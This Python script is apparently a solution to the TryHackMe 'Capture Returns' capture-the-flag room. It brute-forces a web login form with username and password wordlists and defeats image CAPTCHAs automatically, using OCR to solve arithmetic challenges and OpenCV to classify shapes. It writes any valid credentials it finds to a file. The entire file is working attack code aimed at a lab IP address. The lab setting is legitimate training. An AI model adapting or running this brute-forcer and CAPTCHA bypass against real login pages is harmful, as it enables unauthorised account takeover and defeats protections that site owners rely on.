'''
Room Script: https://tryhackme.com/room/capturereturns

Medium Article for explanation: https://medium.com/@Sle3pyHead/capture-returns-ctf-notes-tryhackme-93b63c0b2bf3

Installation Requirements
/usr/bin/python3 -m pip install --upgrade pip
pip3 install pillow opencv-python pytesseract beautifulsoup4 numpy
'''

from PIL import Image
import requests
import cv2
import numpy as np
import base64
import io
import re
import pytesseract
from bs4 import BeautifulSoup
from io import BytesIO
import time

def get_image_from_html(html_content):
    """Extract and decode the image from HTML content with detailed logging."""
    print("      [+] Searching for image in HTML...")
    soup = BeautifulSoup(html_content, 'html.parser')
    img_tag = soup.find('img')
    if img_tag and 'src' in img_tag.attrs:
        src = img_tag['src']
        if src.startswith('data:image/png;base64,'):
            print("      [+] Found base64 image source.")
            try:
                base64_data = src.split('data:image/png;base64,')[-1]
                image_data = base64.b64decode(base64_data)
                image = np.array(Image.open(BytesIO(image_data)))
                print(f"      [+] Image decoded successfully (shape: {image.shape}).")
                return image
            except Exception as e:
                print(f"      [!] Error decoding image: {e}")
                return None
    print("      [!] No valid image source found.")
    return None

def detect_shapes(image):
    """Detect geometric shapes with detailed logging."""
    print("         [-] Trying shape detection...")
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    blurred = cv2.GaussianBlur(gray, (5, 5), 1.5)
    thresh = cv2.adaptiveThreshold(blurred, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY_INV, 11, 2)

    # Detect circles
    circles = cv2.HoughCircles(blurred, cv2.HOUGH_GRADIENT, 1, 20, param1=50, param2=30, minRadius=0, maxRadius=0)
    if circles is not None:
        print("         [-] Shape detected: circle")
        return "circle"

    # Detect other shapes
    contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    print(f"         [-] Found {len(contours)} contours for shape analysis.")
    for cnt in contours:
        peri = cv2.arcLength(cnt, True)
        approx = cv2.approxPolyDP(cnt, 0.04 * peri, True)
        vertices = len(approx)

        if vertices == 3:
            print("         [-] Shape detected: triangle")
            return "triangle"
        elif vertices == 4:
            x, y, w, h = cv2.boundingRect(approx)
            aspect_ratio = float(w) / h
            if 0.95 <= aspect_ratio <= 1.05:
                print("         [-] Shape detected: square")
                return "square"
            else:
                print("         [-] Shape detected: rectangle (treated as square)")
                return "square"

    print("         [-] No distinct shape found, defaulting to 'circle'.")
    return "circle" # Default fallback if no other shape is matched

def solve_equation(image):
    """Solve an equation from an image with detailed logging."""
    print("         [-] Trying equation solving via OCR...")
    if image is None:
        print("         [!] No image provided for equation solving.")
        return None

    try:
        text = pytesseract.image_to_string(image, config='--psm 6')
        clean_text = re.sub(r'[^0-9+\-*/(). ]', '', text).strip()
        print(f"         [-] OCR extracted: '{text.strip()}' -> Cleaned: '{clean_text}'")
        
        # Use a more robust regex to find the equation
        match = re.search(r'(\d+)\s*([\+\-\*/])\s*(\d+)', clean_text)
        if match:
            num1, operator, num2 = int(match.group(1)), match.group(2), int(match.group(3))
            
            if operator == '+': result = num1 + num2
            elif operator == '-': result = num1 - num2
            elif operator == '*': result = num1 * num2
            elif operator == '/': result = num1 // num2 if num2 != 0 else 0
            
            print(f"         [-] Equation solved: {num1} {operator} {num2} = {result}")
            return str(result)
        else:
            print("         [!] No valid equation found in OCR text.")
            return None
    except Exception as e:
        print(f"         [!] Failed to solve equation: {e}")
        return None

def send_post_request(url, data, headers):
    """Sends a POST request with basic logging."""
    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(f"   [!] Request Error: {e}")
        return None

def solve_captcha(html_content):
    """Main CAPTCHA solver function with detailed steps."""
    print("      [+] Starting CAPTCHA solving process...")
    image = get_image_from_html(html_content)
    if image is None:
        return None
    
    # Try to solve as an equation first
    equation_result = solve_equation(image)
    if equation_result is not None:
        print("      [+] CAPTCHA identified as equation.")
        return equation_result
    
    # If equation solving fails, try shape detection
    print("      [+] Equation solving failed or not applicable, trying shape detection.")
    shape_result = detect_shapes(image)
    if shape_result is not None:
        print("      [+] CAPTCHA identified as shape.")
        return shape_result
        
    print("      [!] All CAPTCHA solving methods failed.")
    return None

def handle_login(url, usernames, passwords):
    """Main login handler with detailed progress output."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    session = requests.Session()
    session.headers.update(headers)
    counter = 0

    for username in usernames:
        for password in passwords:
            counter += 1
            print(f"\n--- Attempt #{counter}: Trying {username}:{password} ---")
            
            # Initial login attempt
            login_data = {'username': username, 'password': password}
            response = send_post_request(url, login_data, headers)
            
            if response is None:
                print("   [!] Initial login request failed. Skipping.")
                continue

            # Handle CAPTCHA challenges
            captcha_attempts = 0
            max_captcha_attempts = 10
            
            while "captcha" in response.text.lower() and captcha_attempts < max_captcha_attempts:
                captcha_attempts += 1
                print(f"   [*] CAPTCHA detected (Attempt {captcha_attempts}/{max_captcha_attempts}).")
                
                captcha_solution = solve_captcha(response.text)
                
                if captcha_solution:
                    print(f"   [*] Solved CAPTCHA, solution: '{captcha_solution}'. Submitting...")
                    captcha_data = {
                        'username': username,
                        'password': password,
                        'captcha': captcha_solution
                    }
                    response = send_post_request(url, captcha_data, headers)
                    if response is None:
                        print("   [!] CAPTCHA submission failed. Breaking.")
                        break
                else:
                    print("   [!] Failed to solve CAPTCHA. Breaking from this attempt.")
                    break
                
                time.sleep(1)

            # Check for success
            if response and "administrator login" not in response.text.lower() and "invalid" not in response.text.lower():
                print(f"\n✅ SUCCESS! Credentials found: {username}:{password}")
                with open('successful_logins.txt', 'a') as file:
                    file.write(f'{username}:{password}\n')
                return True # Stop after finding the first valid credentials
            else:
                print("   [-] Login failed or CAPTCHA rejected.")

            # Save response for debugging
            with open('response_log.txt', 'a') as file:
                file.write(f"\n--- Response for {username}:{password} ---\n")
                file.write(response.text)
                file.write("\n--- End Response ---\n")
            
            time.sleep(0.5)

    print("\nBrute-force complete. No successful logins found.")
    return False

def main():
    """Main function to run the script."""
    url = 'http://10.10.130.250/login'
    

    try:
        print(f"Loading credentials for target: {url}")
        with open('usernames.txt', 'r') as file:
            usernames = [line.strip() for line in file if line.strip()]
        with open('passwords.txt', 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
        print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
    except FileNotFoundError as e:
        print(f"Error: {e}. Make sure 'usernames.txt' and 'passwords.txt' exist.")
        return

    handle_login(url, usernames, passwords)

if __name__ == '__main__':
    main()

